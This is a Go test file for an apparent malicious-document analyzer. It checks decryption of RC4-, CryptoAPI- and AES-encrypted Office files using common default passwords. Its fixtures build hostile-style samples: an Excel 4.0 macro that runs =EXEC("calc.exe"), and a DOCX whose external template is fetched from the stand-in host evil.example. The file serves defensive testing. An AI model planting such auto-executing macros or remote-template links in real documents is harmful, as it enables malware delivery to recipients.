package extractor

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rc4"
	"crypto/sha1"
	"crypto/sha512"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strings"
	"testing"

	"github.com/debugactiveprocess/MaldocTrace/internal/cfbtest"
)

// The helpers below encrypt test documents with the same algorithms the
// extractor decrypts. They are written from [MS-OFFCRYPTO] independently of
// the decryption code paths they exercise (key derivation is shared only
// where the specification defines a single function).

var testSalt = []byte("0123456789abcdef")

func rc4Encrypt(key, data []byte) []byte {
	c, _ := rc4.NewCipher(key)
	out := make([]byte, len(data))
	c.XORKeyStream(out, data)
	return out
}

// biffFilePassRC4 builds a FILEPASS body for RC4 (MD5) encryption.
func biffFilePassRC4(password string) ([]byte, *biffRC4) {
	h := &biffRC4{salt: testSalt, keyBits: 128}
	verifier := []byte("verifier-16bytes")
	vh := md5.Sum(verifier)
	enc := rc4Encrypt(h.keyFunc(password)(0), append(append([]byte{}, verifier...), vh[:]...))
	body := []byte{1, 0, 1, 0, 1, 0}
	body = append(body, testSalt...)
	body = append(body, enc...)
	return body, h
}

// biffFilePassCryptoAPI builds a FILEPASS body for RC4 CryptoAPI encryption.
func biffFilePassCryptoAPI(password string, keyBits int) ([]byte, *biffRC4) {
	h := &biffRC4{salt: testSalt, keyBits: keyBits, cryptoAPI: true}
	verifier := []byte("verifier-16bytes")
	vh := sha1.Sum(verifier)
	enc := rc4Encrypt(h.keyFunc(password)(0), append(append([]byte{}, verifier...), vh[:]...))
	hdr := make([]byte, 32)
	binary.LittleEndian.PutUint32(hdr[8:], 0x6801)  // CALG_RC4
	binary.LittleEndian.PutUint32(hdr[12:], 0x8004) // CALG_SHA1
	binary.LittleEndian.PutUint32(hdr[16:], uint32(keyBits))
	body := []byte{1, 0, 4, 0, 2, 0}
	body = binary.LittleEndian.AppendUint32(body, 0x04) // flags
	body = binary.LittleEndian.AppendUint32(body, uint32(len(hdr)))
	body = append(body, hdr...)
	body = binary.LittleEndian.AppendUint32(body, 16)
	body = append(body, testSalt...)
	body = append(body, enc[:16]...)
	body = binary.LittleEndian.AppendUint32(body, 20)
	body = append(body, enc[16:]...)
	return body, h
}

func encryptedWorkbook(t *testing.T, filePass []byte, h *biffRC4, password string) []byte {
	t.Helper()
	exec := `=EXEC("calc.exe")`
	plain := cfbtest.MacroWorkbookStream(filePass, "Macro1", true, 0, 0, "Enable editing", []cfbtest.Formula{
		{Row: 0, Col: 0, Rgce: cfbtest.Cat(cfbtest.PtgStr(exec), cfbtest.PtgRef(2, 0), cfbtest.PtgFuncVar(2, 0x8000|96))},
		{Row: 1, Col: 0, Rgce: cfbtest.PtgFuncVar(0, 54)},
	})
	// RC4 is symmetric: "decrypting" the plain stream encrypts it.
	return cfbtest.Build(cfbtest.Stream{Name: "Workbook", Data: decryptBIFF(plain, h.keyFunc(password))})
}

func TestBIFFDecryption(t *testing.T) {
	cases := []struct {
		name, password, scheme string
		build                  func(string) ([]byte, *biffRC4)
	}{
		{"rc4-velvet", "VelvetSweatshop", "BIFF8 RC4", biffFilePassRC4},
		{"rc4-common", "123456", "BIFF8 RC4", biffFilePassRC4},
		{"cryptoapi-40", "VelvetSweatshop", "BIFF8 RC4 CryptoAPI (40-bit)", func(p string) ([]byte, *biffRC4) { return biffFilePassCryptoAPI(p, 40) }},
		{"cryptoapi-128", "infected", "BIFF8 RC4 CryptoAPI (128-bit)", func(p string) ([]byte, *biffRC4) { return biffFilePassCryptoAPI(p, 128) }},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			fp, h := c.build(c.password)
			data := encryptedWorkbook(t, fp, h, c.password)
			res, err := Extract(context.Background(), data, nil)
			if err != nil {
				t.Fatal(err)
			}
			if !res.Encrypted || res.Decryption == nil || !res.Decryption.Decrypted || res.Decryption.Password != c.password || res.Decryption.Scheme != c.scheme {
				t.Fatalf("decryption = %+v", res.Decryption)
			}
			if !res.HasXLM() {
				t.Fatalf("macro sheet not read after decryption: sheets=%+v diags=%+v", res.Sheets, res.Diagnostics)
			}
			found := false
			for _, s := range res.Sheets {
				for _, cell := range s.Cells {
					if strings.Contains(cell.Formula, "calc.exe") {
						found = true
					}
				}
			}
			if !found {
				t.Errorf("decrypted formula not found: %+v", res.Sheets)
			}
		})
	}
}

func TestBIFFUnknownPassword(t *testing.T) {
	fp, h := biffFilePassRC4("not-in-the-list-9f1c")
	data := encryptedWorkbook(t, fp, h, "not-in-the-list-9f1c")
	res, _ := Extract(context.Background(), data, nil)
	if res.Decryption == nil || res.Decryption.Decrypted || !res.Unreadable() || res.HasXLM() {
		t.Fatalf("decryption = %+v xlm=%v", res.Decryption, res.HasXLM())
	}
	lim := DefaultLimits()
	lim.Passwords = []string{"not-in-the-list-9f1c"}
	res, _ = Extract(context.Background(), data, &lim)
	if res.Decryption == nil || !res.Decryption.Decrypted || !res.HasXLM() {
		t.Fatalf("user password not used: %+v", res.Decryption)
	}
}

// --- OOXML ---

func testDocx(t *testing.T, body string) []byte {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	f, _ := w.Create("[Content_Types].xml")
	f.Write([]byte(`<Types/>`))
	f, _ = w.Create("word/document.xml")
	f.Write([]byte(`<w:document xmlns:w="w"><w:body><w:p><w:r><w:t>` + body + `</w:t></w:r></w:p></w:body></w:document>`))
	f, _ = w.Create("word/_rels/settings.xml.rels")
	f.Write([]byte(`<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`))
	w.Close()
	return buf.Bytes()
}

func padBlock(b []byte, n int) []byte {
	if r := len(b) % n; r != 0 {
		b = append(append([]byte{}, b...), make([]byte, n-r)...)
	}
	return b
}

func ecbEncrypt(key, data []byte) []byte {
	b, _ := aes.NewCipher(key)
	data = padBlock(data, aes.BlockSize)
	out := make([]byte, len(data))
	for i := 0; i < len(data); i += aes.BlockSize {
		b.Encrypt(out[i:], data[i:])
	}
	return out
}

func cbcEncrypt(key, iv, data []byte) []byte {
	b, _ := aes.NewCipher(key)
	data = padBlock(data, aes.BlockSize)
	out := make([]byte, len(data))
	cipher.NewCBCEncrypter(b, iv[:aes.BlockSize]).CryptBlocks(out, data)
	return out
}

func encryptedPackageCFB(info, pkg []byte) []byte {
	return cfbtest.Build(cfbtest.Stream{Name: "EncryptionInfo", Data: info}, cfbtest.Stream{Name: "EncryptedPackage", Data: pkg})
}

func standardEncrypt(password string, plain []byte) []byte {
	s := &standardInfo{keyBits: 128, salt: testSalt}
	key := s.key(password)
	verifier := []byte("verifier-16bytes")
	vh := sha1.Sum(verifier)
	hdr := make([]byte, 32)
	binary.LittleEndian.PutUint32(hdr[0:], 0x24)
	binary.LittleEndian.PutUint32(hdr[8:], 0x660E)
	binary.LittleEndian.PutUint32(hdr[12:], 0x8004)
	binary.LittleEndian.PutUint32(hdr[16:], 128)
	binary.LittleEndian.PutUint32(hdr[20:], 0x18)
	info := []byte{3, 0, 2, 0, 0x24, 0, 0, 0}
	info = binary.LittleEndian.AppendUint32(info, uint32(len(hdr)))
	info = append(info, hdr...)
	info = binary.LittleEndian.AppendUint32(info, 16)
	info = append(info, testSalt...)
	info = append(info, ecbEncrypt(key, verifier)...)
	info = binary.LittleEndian.AppendUint32(info, 20)
	info = append(info, ecbEncrypt(key, vh[:])...)
	pkg := binary.LittleEndian.AppendUint64(nil, uint64(len(plain)))
	pkg = append(pkg, ecbEncrypt(key, plain)...)
	return encryptedPackageCFB(info, pkg)
}

func agileEncrypt(password string, plain []byte) []byte {
	const spin = 1000
	keySalt := []byte("keydata-salt-16b")
	pwSalt := testSalt
	secret := []byte("0123456789abcdef0123456789abcdef") // 256-bit data key
	h := sha512.Sum512(append(append([]byte{}, pwSalt...), utf16le(password)...))
	hh := h[:]
	for i := 0; i < spin; i++ {
		s := sha512.Sum512(append(le32(uint32(i)), hh...))
		hh = s[:]
	}
	derive := func(blk []byte) []byte {
		s := sha512.Sum512(append(append([]byte{}, hh...), blk...))
		return s[:32]
	}
	verifier := []byte("verifier-input16")
	vhash := sha512.Sum512(verifier)
	evhi := cbcEncrypt(derive(agileBlkVerifierInput), pwSalt, verifier)
	evhv := cbcEncrypt(derive(agileBlkVerifierValue), pwSalt, vhash[:])
	ekv := cbcEncrypt(derive(agileBlkKeyValue), pwSalt, secret)
	b64 := base64.StdEncoding.EncodeToString
	xmlInfo := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<encryption xmlns="http://schemas.microsoft.com/office/2006/encryption" xmlns:p="http://schemas.microsoft.com/office/2006/keyEncryptor/password">
<keyData saltSize="16" blockSize="16" keyBits="256" hashSize="64" cipherAlgorithm="AES" cipherChaining="ChainingModeCBC" hashAlgorithm="SHA512" saltValue="%s"/>
<keyEncryptors><keyEncryptor uri="http://schemas.microsoft.com/office/2006/keyEncryptor/password">
<p:encryptedKey spinCount="%d" saltSize="16" blockSize="16" keyBits="256" hashSize="64" cipherAlgorithm="AES" cipherChaining="ChainingModeCBC" hashAlgorithm="SHA512" saltValue="%s" encryptedVerifierHashInput="%s" encryptedVerifierHashValue="%s" encryptedKeyValue="%s"/>
</keyEncryptor></keyEncryptors></encryption>`, b64(keySalt), spin, b64(pwSalt), b64(evhi), b64(evhv), b64(ekv))
	info := append([]byte{4, 0, 4, 0, 0x40, 0, 0, 0}, xmlInfo...)
	pkg := binary.LittleEndian.AppendUint64(nil, uint64(len(plain)))
	for i := 0; i*4096 < len(plain); i++ {
		chunk := plain[i*4096:]
		if len(chunk) > 4096 {
			chunk = chunk[:4096]
		}
		ivh := sha512.Sum512(append(append([]byte{}, keySalt...), le32(uint32(i))...))
		pkg = append(pkg, cbcEncrypt(secret, ivh[:16], chunk)...)
	}
	return encryptedPackageCFB(info, pkg)
}

func TestOOXMLDecryption(t *testing.T) {
	// A body larger than one 4096-byte segment exercises per-segment IVs.
	body := "Invoice " + strings.Repeat("lorem ipsum ", 600)
	plain := testDocx(t, body)
	cases := []struct {
		name, password, scheme string
		data                   []byte
	}{
		{"standard", "VelvetSweatshop", "ECMA-376 Standard (AES-128)", standardEncrypt("VelvetSweatshop", plain)},
		{"agile", "infected", "ECMA-376 Agile (AES-256, SHA512)", agileEncrypt("infected", plain)},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			res, err := Extract(context.Background(), c.data, nil)
			if err != nil {
				t.Fatalf("%v (diags %+v)", err, res.Diagnostics)
			}
			if res.Decryption == nil || !res.Decryption.Decrypted || res.Decryption.Password != c.password || res.Decryption.Scheme != c.scheme {
				t.Fatalf("decryption = %+v", res.Decryption)
			}
			if res.Format != FormatOOXML || !strings.HasPrefix(res.DocumentText, "Invoice lorem") {
				t.Fatalf("format=%v text=%q", res.Format, res.DocumentText[:min(40, len(res.DocumentText))])
			}
			if len(res.External) == 0 {
				t.Errorf("static scan did not run on the decrypted package")
			}
		})
	}
	res, err := Extract(context.Background(), agileEncrypt("unlisted-pw-77", plain), nil)
	if err == nil || res.Decryption == nil || res.Decryption.Decrypted || !strings.Contains(res.Decryption.Note, "--password") {
		t.Fatalf("unknown password: err=%v dec=%+v", err, res.Decryption)
	}
}

func TestCFBUnusedEntryMidDirectory(t *testing.T) {
	data := cfbtest.Build(cfbtest.Stream{Name: "A", Data: []byte("first")}, cfbtest.Stream{Name: "B", Data: []byte("second")})
	// Turn entry 1 ("A") into an unused entry and link the root to entry 2,
	// as some generators leave holes in the directory.
	dirSector := int(binary.LittleEndian.Uint32(data[0x30:]))
	dir := 512 + dirSector*512
	root, a, b := data[dir:dir+128], data[dir+128:dir+256], data[dir+256:dir+384]
	for i := range a {
		a[i] = 0
	}
	binary.LittleEndian.PutUint32(a[68:], 0xFFFFFFFF)
	binary.LittleEndian.PutUint32(a[72:], 0xFFFFFFFF)
	binary.LittleEndian.PutUint32(a[76:], 0xFFFFFFFF)
	binary.LittleEndian.PutUint32(root[76:], 2)
	_ = b
	r, err := parseCFB(data, &Limits{MaxInputSize: 1 << 20, MaxContainerEntries: 100, MaxStreams: 100, MaxDecompressed: 1 << 20, MaxModuleSize: 1 << 20, MaxNestedDepth: 2, MaxZipRatio: 100})
	if err != nil {
		t.Fatal(err)
	}
	if r.find("B") == nil {
		t.Fatalf("stream after an unused entry was dropped: %v", r.listStreams())
	}
}

func FuzzEncryptionHeaders(f *testing.F) {
	fp, _ := biffFilePassCryptoAPI("x", 128)
	f.Add(fp)
	rc, _ := biffFilePassRC4("x")
	f.Add(rc)
	f.Add([]byte{4, 0, 4, 0, 0x40, 0, 0, 0, '<', 'e', '/', '>'})
	f.Add([]byte{3, 0, 2, 0, 0x24, 0, 0, 0, 32, 0, 0, 0})
	f.Fuzz(func(t *testing.T, b []byte) {
		if h, _, err := parseFilePass(b); err == nil {
			kf := h.keyFunc("VelvetSweatshop")
			h.verify(kf)
			decryptBIFF(b, kf)
		}
		openEncryptedPackage(b, b, []string{"VelvetSweatshop"})
	})
}
